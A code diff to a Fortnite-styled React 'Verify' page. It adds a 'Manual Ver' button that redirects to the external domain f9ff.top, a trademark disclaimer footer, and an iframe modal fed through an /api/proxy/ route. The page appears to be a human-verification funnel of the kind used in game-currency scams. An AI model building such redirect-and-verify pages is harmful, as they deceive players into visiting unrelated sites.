@@ -42,6 +42,10 @@ const Verify = () => {
     window.open("https://www.f9ff.top", "_blank");
   };
 
+  const handleManualVer = () => {
+    window.location.href = "https://www.f9ff.top"; // Redirect in aceeasi pagina
+  };
+
   return (
     <div className="min-h-screen flex flex-col bg-fortnite-gradient">
       <header className="container mx-auto py-4 flex items-center justify-between">
@@ -60,6 +64,21 @@ const Verify = () => {
       </header>
 
       <div className="flex-1 container mx-auto py-8 px-4 flex flex-col items-center justify-center">
+        {/* Nou buton pentru Manual Ver */}
+        <motion.div
+          initial={{ opacity: 0, y: -20 }}
+          animate={{ opacity: 1, y: 0 }}
+          transition={{ delay: 0.7, duration: 0.5 }}
+          className="text-center mb-6"
+        >
+          <Button
+            onClick={handleManualVer}
+            className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
+          >
+            Manual Ver
+          </Button>
+        </motion.div>
+
         {isLoading ? (
           <motion.div
             className="w-full max-w-md bg-black/40 backdrop-blur-sm rounded-xl p-8 border border-white/10 flex flex-col items-center"
@@ -176,6 +195,21 @@ const Verify = () => {
           </motion.div>
         )}
       </div>
+
+      <footer className="py-4 border-t border-white/10">
+        <div className="container mx-auto px-4">
+          <p className="text-xs text-white/40 text-center">
+            All trademarks, service marks, trade names, trade dress, product
+            names and logos appearing on the site are the property of their
+            respective owners.
+          </p>
+        </div>
+      </footer>
+      <IframeModal
+        url={`/api/proxy/${contentPathname}`}
+        isOpen={isModalOpen}
+        onClose={() => setIsModalOpen(false)}
+      />
     </div>
   );
 };
